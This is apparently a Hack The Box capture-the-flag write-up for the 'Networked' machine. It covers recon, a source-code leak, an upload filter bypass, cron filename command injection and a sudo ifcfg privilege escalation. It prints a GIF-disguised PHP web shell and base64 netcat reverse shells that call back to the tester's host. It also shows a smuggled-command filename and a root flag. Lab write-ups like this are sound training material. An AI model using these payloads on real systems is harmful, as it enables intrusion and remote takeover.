## Intro


Tags: #linux #OSCPpath #FileUpload #codereview #unknown-binary #easy 
 
-----
# Reconnaissance

Add machine to `/etc/hosts`
```shell
echo '10.129.26.193 networked.htb' | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n networked.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-22 11:50 -0400
Nmap scan report for networked.htb (10.129.26.193)
Host is up (0.049s latency).
Not shown: 65500 filtered tcp ports (no-response), 32 filtered tcp ports (host-prohibited), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A networked.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-22 11:52 -0400
Nmap scan report for networked.htb (10.129.26.193)
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router|specialized
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (95%), MikroTik RouterOS 7.X (90%), Crestron 2-Series (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:crestron:2_series
Aggressive OS guesses: Linux 3.10 - 4.11 (95%), Linux 3.2 - 4.14 (95%), Linux 2.6.32 - 3.13 (90%), Linux 3.4 - 3.10 (90%), Linux 4.15 (90%), Linux 4.15 - 5.19 (90%), Linux 5.0 - 5.14 (90%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (90%), Linux 2.6.32 - 3.10 (89%), Linux 3.13 - 4.4 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   48.17 ms 10.10.14.1
2   48.80 ms networked.htb (10.129.26.193)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds
```

## Webapp

![](HTB_machines/MediaFiles/Pasted%20image%2020260622185048.png)

### page source

```html
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
```
we got a hint for an upload gallery, so lets move on with enumeration

## Directory enumeration

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://networked.htb/FUZZ
```

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://networked.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

backup                  [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 47ms]
uploads                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 46ms]
:: Progress: [29999/29999] :: Job [1/1] :: 819 req/sec :: Duration: [0:00:41] :: Errors: 1 ::
```

### Navigate towards discovered directories

#### Source code leak

Lets navigate to `/backups`
![](HTB_machines/MediaFiles/Pasted%20image%2020260622185324.png)lets download and extract, inside there are these files
```shell
─$ ls
index.php  lib.php  photos.php  upload.php
```
lets try to see which of those are accessible via browser
`photos.php`
![](HTB_machines/MediaFiles/Pasted%20image%2020260622185517.png)

#### File upload discovered
`upload`
![](HTB_machines/MediaFiles/Pasted%20image%2020260622185547.png)
great! we can upload files, but before uploading, lets take a look at it's source code first:
```php
<?php
require '/var/www/html/lib.php';

define("UPLOAD_DIR", "/var/www/html/uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo "<p>Unable to save file.</p>";
        exit;
    }
    echo "<p>file uploaded, refresh gallery</p>";

    // set proper permissions on the new file
    chmod(UPLOAD_DIR . $name, 0644);
  }
} else {
  displayform();
}
?>
```
there are the following upload validation methods used on php files altogether:
`check_file_type()`
`file_mime_type()`
`filesize()`
File extension also must be `.jpg, .png, .gif, .jpeg`

-----
# Foothold

## Bypass file upload validation 

- To bypass the mime type validation, adding `GIF89a;` to the first line of a shell code. Bypassing the other methods can be achieved through changing the file extension and ensuring the file does not exceed 60,000 bytes.

`webshell.php.gif`
```shell
GIF89a;
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.148/5555 0>&1'");
?>
```
once uploaded, we are given this message
![](HTB_machines/MediaFiles/Pasted%20image%2020260622190148.png)
so lets start our listener
```shell
nc -lvnp 5555
```
then navigate to
```shell
http://networked.htb/photos.php
```

## Shell as apache
got shell back on my listener as apache
```shell
└─$ nc -lvnp 5555                                                                               
listening on [any] 5555 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.26.193] 57412
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
bash-4.2$ 
```
tried to get user flag but got denied
```shell
bash-4.2$ cd guly
cd guly
bash-4.2$ ls
ls
check_attack.php
crontab.guly
user.txt
bash-4.2$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
bash-4.2$ ls -la
ls -la
total 28
drwxr-xr-x. 2 guly guly 4096 Sep  6  2022 .
drwxr-xr-x. 3 root root   18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root    9 Sep  7  2022 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly   33 Jun 22 17:49 user.txt
```

### Filesystem enumeration
#### Crontab
found sth interesting, lets view the crontab
```shell
bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```
`check_attack.php` -> processes files in the `uploads` directory:
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
I can’t access `user.txt`, but the other two are interesting. `crontab.guly` shows a config that would run `php /home/guly/check_attack.php` every 3 minutes:

I’m immediately drawn to one line:
```shell
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```
If I can control `$path` or `$value`, there’s obvious code injection.

##### Exploitation

`$path` is set statically at the top of the file. But `$value` is not. I’ll open a `php` shell again and see what’s happening. It starts by reading all the files in the `uploads` directory, and using `preg_grep` to select ones that don’t start with `.`
 This can be used to inject and run a command by including a semicolon in the front of the filename to obtain a shell as
```shell
└─$ echo nc -e /bin/bash 10.10.14.148 4444 | base64 -w0                                        
bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjE0OCA0NDQ0Cg==
```

```shell
echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjE0OCA0NDQ0Cg== | base64 -d | sh
```
but this only gives shell as apache
```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.26.193] 37230
whoami
apache
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'     
bash-4.2$ whoami
whoami
apache
bash-4.2$ 
```
lets do it correctly:
```shell
touch '/var/www/html/uploads/b; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjE0OCA0NDQ0Cg== | base64 -d | sh; b'
```
When the script runs, it will loop over the files, and when it runs over mine, it will set `$value` to `a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjE0OCA0NDQ0Cg==  | base64 -d | sh; b` and run:
```shell
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```
Which means it will run:
```shell
exec("nohup /bin/rm -f /var/www/html/uploads/a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b > /dev/null 2>&1 &");
```
got shell:
## Shell as guly
```shell
└─$ nc -lvnp 4444                                                                                             
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.26.193] 37236
python -c 'import pty; pty.spawn("/bin/bash")'
[guly@networked ~]$ whoami
whoami
guly
[guly@networked ~]$ 
```

---
# Privesc

## sudo -l
```shell
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

`/usr/local/sbin/changename.sh`
```shell
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
lets try running it, i will input `sudo su`
```shell
[guly@networked ~]$ /usr/local/sbin/changename.sh
/usr/local/sbin/changename.sh
/usr/local/sbin/changename.sh: line 2: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface NAME:
sudo su
sudo su
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface PROXY_METHOD:
sudo su
sudo su
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface BROWSER_ONLY:
sudo su
sudo su
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
interface BOOTPROTO:
sudo su
sudo su
/usr/local/sbin/changename.sh: line 18: /etc/sysconfig/network-scripts/ifcfg-guly: Permission denied
grep: /etc/sysconfig/network-scripts/ifcfg-eth0: Permission denied
grep: /etc/sysconfig/network-scripts/ifcfg-eth0: Permission denied
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: /tmp/foo: No such file or directory
Users cannot control this device.
```
i see permission denied, so it seems it tries to run my input!

## Network interface configuration file (ifcfg)
### Vulnerability

then found for this part, regarding `network-scripts`
`echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly`
https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f

## Shell as root

lets now get shell
```shell
sudo /usr/local/sbin/changename.sh
```
grabbed root flag
```shell
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
ch3ckm8
ch3ckm8
interface PROXY_METHOD:
a /bin/bash
a /bin/bash
interface BROWSER_ONLY:
f
f
interface BOOTPROTO:
d
d
[root@networked network-scripts]# whoami
whoami
root
[root@networked network-scripts]# cd
cd
[root@networked ~]# cat root.txt
cat root.txt
7c8c3b29059121f198987f6179b4c2b6
```

-------
# Summary



-----
# Sidenotes